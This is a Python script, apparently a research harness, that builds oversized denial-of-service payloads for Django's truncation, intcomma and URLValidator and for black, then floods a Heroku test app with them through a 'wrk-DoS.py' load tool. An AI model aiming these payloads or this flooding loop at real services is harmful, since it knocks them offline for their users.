import os
import subprocess
import time
from datetime import datetime
from shlex import split

def create_string(char_length):
    return 'x' * char_length

def create_truncate_payload(char_length):
    return '<' * char_length

def create_intcomma_payload(char_length):
    return '123' * char_length + 'a'

def create_URLValidator_payload(char_length):
    return 'https://' + 'x' * char_length + '.com'

def execute_wrk_dos(framework_name, payload_length, folder_name):
    if framework_name == "black":
        result = create_string(payload_length)
    elif framework_name == "django":
        result = create_truncate_payload(payload_length)
    elif framework_name == "intcomma":
        z = payload_length // 3
        result = create_intcomma_payload(z)
    elif framework_name == "URLValidator":
        result = create_URLValidator_payload(payload_length)
    
    url = f"https://python-wrk-dos-297bbdc7a05a.herokuapp.com/{framework_name}"
    command_str = f'python3 wrk-DoS.py -m1 -d60 -H "payload:{result}" --payload "data=example" -R100 -u https://python-wrk-dos-297bbdc7a05a.herokuapp.com -a {url} -p {folder_name} --attack-rate 100'
    command = split(command_str)
    # print(command)
    subprocess.run(command)
    # subprocess.run(["heroku", "restart", "--app", "python-wrk-dos"])
    print("Going to sleep")
    time.sleep(180)

if __name__ == "__main__":
    framework_names = ["black", "django", "intcomma", "URLValidator"]
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")

    # Create a folder with the timestamp
    folder_name = f"result_{timestamp}"
    os.makedirs(folder_name)

    for framework_name in framework_names:
        # payload_lengths = [10, 100, 1000, 3000, 5000, 10000, 50000]
        payload_lengths = [3000, 5000, 10000, 50000]
        for payload_length in payload_lengths:
            execute_wrk_dos(framework_name, payload_length, folder_name)
